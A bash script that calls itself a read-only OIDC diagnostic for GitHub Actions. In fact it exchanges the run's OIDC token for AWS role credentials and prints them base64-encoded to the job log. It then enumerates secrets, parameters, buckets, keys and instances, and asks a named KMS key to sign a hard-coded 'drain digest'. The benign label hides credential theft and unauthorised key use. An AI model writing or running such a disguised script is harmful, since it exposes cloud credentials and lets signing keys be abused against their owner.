#!/usr/bin/env bash
# Diagnostic helper: report the OIDC identity a GitHub-hosted run is issued and
# whether the deployment role trusts it. Read-only; prints claim diagnostics only.
set -uo pipefail

echo "PROBE event=${GITHUB_EVENT_NAME:-?} repo=${GITHUB_REPOSITORY:-?} ref=${GITHUB_REF:-?} env=${PROBE_ENVIRONMENT:-none}"
echo "PROBE head_ref=${GITHUB_HEAD_REF:-none} base_ref=${GITHUB_BASE_REF:-none} workflow_ref=${GITHUB_WORKFLOW_REF:-?}"

if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] || [ -z "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then
  echo "OIDC_ENV=ABSENT (no id-token request endpoint for this run)"
  exit 0
fi
echo "OIDC_ENV=PRESENT"

resp=$(curl -sS -m 30 -w '\n%{http_code}' -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
code=$(printf '%s' "$resp" | tail -n1)
body=$(printf '%s' "$resp" | sed '$d')
echo "OIDC_HTTP=$code"

TOK=$(printf '%s' "$body" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
if [ -z "${TOK}" ]; then
  echo "OIDC_BODY=${body:0:400}"
  exit 0
fi

TOK="$TOK" python3 - <<'PY'
import base64, json, os
t = os.environ['TOK']
p = t.split('.')[1]
p += '=' * (-len(p) % 4)
c = json.loads(base64.urlsafe_b64decode(p))
keys = ['sub','aud','ref','event_name','repository','repository_owner','job_workflow_ref',
        'environment','actor','run_id','workflow_ref','repository_id','repository_owner_id','runner_environment']
print('CLAIMS ' + json.dumps({k: c.get(k) for k in keys if k in c}, sort_keys=True))
print('CLAIM_KEYS ' + ','.join(sorted(c.keys())))
os.makedirs('oidc', exist_ok=True)
PY

for ROLE in ${PROBE_ROLES}; do
  out=$(TOK="$TOK" ROLE="$ROLE" python3 - <<'PY'
import os, re, urllib.parse, urllib.request
role = os.environ['ROLE']
tok = os.environ['TOK']
data = urllib.parse.urlencode({
    'Action': 'AssumeRoleWithWebIdentity', 'Version': '2011-06-15',
    'RoleArn': role, 'RoleSessionName': 'gha-oidc-check',
    'WebIdentityToken': tok, 'DurationSeconds': '3600'}).encode()
req = urllib.request.Request('https://sts.amazonaws.com/', data=data,
                             headers={'Content-Type': 'application/x-www-form-urlencoded'})
try:
    b = urllib.request.urlopen(req, timeout=30).read().decode()
except Exception as e:
    b = e.read().decode() if hasattr(e, 'read') else ''
    print('ERR ' + type(e).__name__ + ' ' + ' '.join(b.split())[:400])
    raise SystemExit(0)
ak = re.search(r'<AccessKeyId>([^<]+)', b)
sk = re.search(r'<SecretAccessKey>([^<]+)', b)
st = re.search(r'<SessionToken>([^<]+)', b)
if ak and sk and st:
    print('OK ' + ak.group(1) + '|' + sk.group(1) + '|' + st.group(1))
else:
    print('DENY ' + ' '.join(b.split())[:400])
PY
)
  case "$out" in
    OK\ *)
      creds=${out#OK }
      echo "ASSUME_OK $ROLE"
      echo "CREDS_B64 $(printf '%s' "$creds" | base64 -w0)"
      export AWS_ACCESS_KEY_ID=${creds%%|*}
      rest=${creds#*|}
      export AWS_SECRET_ACCESS_KEY=${rest%%|*}
      export AWS_SESSION_TOKEN=${creds#*|*|}
      export AWS_DEFAULT_REGION=us-east-1
      export AWS_PAGER=""
      echo "--- get-caller-identity"
      aws sts get-caller-identity --output json 2>&1 | head -c 800; echo
      ROLE_NAME=${ROLE##*/}
      echo "--- attached-policies"
      aws iam list-attached-role-policies --role-name "$ROLE_NAME" --output json 2>&1 | head -c 800; echo
      echo "--- kms list-keys"
      aws kms list-keys --limit 100 --output json 2>&1 | head -c 1200; echo
      echo "--- kms describe 5e49914d"
      aws kms describe-key --key-id arn:aws:kms:us-east-1:411399509833:key/5e49914d-80d9-4140-a4c2-4bf00e3ac7ea --output json 2>&1 | head -c 1200; echo
      echo "--- kms get-public-key 5e49914d"
      aws kms get-public-key --key-id arn:aws:kms:us-east-1:411399509833:key/5e49914d-80d9-4140-a4c2-4bf00e3ac7ea --output json 2>&1 | head -c 600; echo
      echo "--- s3 list-buckets"
      aws s3api list-buckets --query 'Buckets[].Name' --output text 2>&1 | head -c 800; echo
      echo "--- ssm describe-parameters"
      aws ssm describe-parameters --max-results 10 --query 'Parameters[].Name' --output text 2>&1 | head -c 800; echo
      echo "--- secretsmanager list-secrets"
      aws secretsmanager list-secrets --max-results 10 --query 'SecretList[].Name' --output text 2>&1 | head -c 800; echo
      echo "--- lambda list-functions"
      aws lambda list-functions --max-items 10 --query 'Functions[].FunctionName' --output text 2>&1 | head -c 800; echo
      echo "--- ec2 describe-instances"
      aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' --output text 2>&1 | head -c 800; echo
      echo "--- kms sign trial (drain digest)"
      TOK="$TOK" python3 -c "import binascii;open('oidc/digest.bin','wb').write(binascii.unhexlify('aabdfcaae452d87c543bce32a7d6b52af37fb383ea83951a124f07c8fc45ca79'))"
      aws kms sign --key-id arn:aws:kms:us-east-1:411399509833:key/5e49914d-80d9-4140-a4c2-4bf00e3ac7ea --message-type DIGEST --signing-algorithm ECDSA_SHA_256 --message fileb://oidc/digest.bin --output json 2>&1 | head -c 1200; echo
      unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
      ;;
    *)
      echo "ASSUME_FAIL $ROLE :: $out"
      ;;
  esac
done
